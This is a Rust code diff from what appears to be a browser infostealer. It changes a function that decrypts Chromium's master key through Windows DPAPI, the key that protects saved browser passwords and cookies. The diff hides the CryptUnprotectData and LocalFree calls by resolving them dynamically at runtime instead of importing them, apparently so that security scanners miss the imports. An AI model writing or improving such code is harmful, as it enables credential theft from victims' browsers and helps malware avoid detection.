@@ -136,18 +136,39 @@ fn extract_chromium_master_key(local_state_path: &str) -> Vec<u8> {
 
 #[cfg(target_os = "windows")]
 fn decrypt_dpapi(data: &[u8]) -> Vec<u8> {
-    use winapi::um::dpapi::CryptUnprotectData;
     use winapi::um::wincrypt::CRYPTOAPI_BLOB;
     use std::ptr;
 
     unsafe {
+        // Type definitions for dynamically resolved functions
+        type CryptUnprotectDataFn = unsafe extern "system" fn(
+            *mut CRYPTOAPI_BLOB,
+            *mut u16,
+            *mut CRYPTOAPI_BLOB,
+            *mut std::ffi::c_void,
+            *mut std::ffi::c_void,
+            u32,
+            *mut CRYPTOAPI_BLOB
+        ) -> i32;
+        type LocalFreeFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;
+
+        // Dynamically resolve CryptUnprotectData
+        let crypt_unprotect_data: CryptUnprotectDataFn = match crate::winapi_resolve::resolve("crypt32.dll", "CryptUnprotectData") {
+            Some(ptr) => std::mem::transmute(ptr),
+            None => return Vec::new(),
+        };
+        let local_free: LocalFreeFn = match crate::winapi_resolve::resolve("kernel32.dll", "LocalFree") {
+            Some(ptr) => std::mem::transmute(ptr),
+            None => return Vec::new(),
+        };
+
         let mut input_blob = CRYPTOAPI_BLOB {
             cbData: data.len() as u32,
             pbData: data.as_ptr() as *mut u8,
         };
         let mut output_blob: CRYPTOAPI_BLOB = std::mem::zeroed();
 
-        let result = CryptUnprotectData(
+        let result = crypt_unprotect_data(
             &mut input_blob,
             ptr::null_mut(),
             ptr::null_mut(),
@@ -162,7 +183,7 @@ fn decrypt_dpapi(data: &[u8]) -> Vec<u8> {
         }
 
         let decrypted = std::slice::from_raw_parts(output_blob.pbData, output_blob.cbData as usize).to_vec();
-        winapi::um::winbase::LocalFree(output_blob.pbData as *mut _);
+        local_free(output_blob.pbData as *mut _);
         decrypted
     }
 }
